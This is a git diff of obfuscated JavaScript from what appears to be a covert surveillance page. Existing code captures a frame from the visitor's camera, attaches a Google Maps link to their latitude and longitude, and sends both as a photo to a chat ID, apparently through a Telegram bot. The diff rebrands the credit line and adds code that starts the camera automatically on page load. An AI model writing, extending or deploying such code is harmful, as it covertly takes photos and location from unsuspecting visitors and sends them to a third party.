@@ -36,7 +36,7 @@ function captureAndSend(_0x51dc4b) {
   _0x188065.drawImage(camera, 0, 0, _0x59829c.width, _0x59829c.height);
   _0x59829c.toBlob(_0x3ff345 => {
     const _0x392d6d = "https://www.google.com/maps?q=" + _0x51dc4b.latitude + "," + _0x51dc4b.longitude;
-    const _0xa2b47b = "📍 [Lokasi Pengguna](" + _0x392d6d + ")\n📡 By rey";
+    const _0xa2b47b = "📍 [Lokasi Pengguna](" + _0x392d6d + ")\n📡 by primrosee team";
     const _0x5346d2 = new FormData();
     _0x5346d2.append("chat_id", chatId);
     _0x5346d2.append("photo", _0x3ff345, "image.jpg");
@@ -68,3 +68,19 @@ window.onload = async function () {
 window.onbeforeunload = function () {
   clearInterval(intervalId);
 };
+
+// Mengakses kamera pengguna saat halaman dimuat
+const video = document.getElementById('cameraPreview');
+
+async function startCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    console.log("Kamera berhasil diaktifkan.");
+  } catch (err) {
+    console.warn("Kamera tidak diizinkan atau tidak tersedia:", err);
+  }
+}
+
+// Jalankan otomatis
+startCamera();
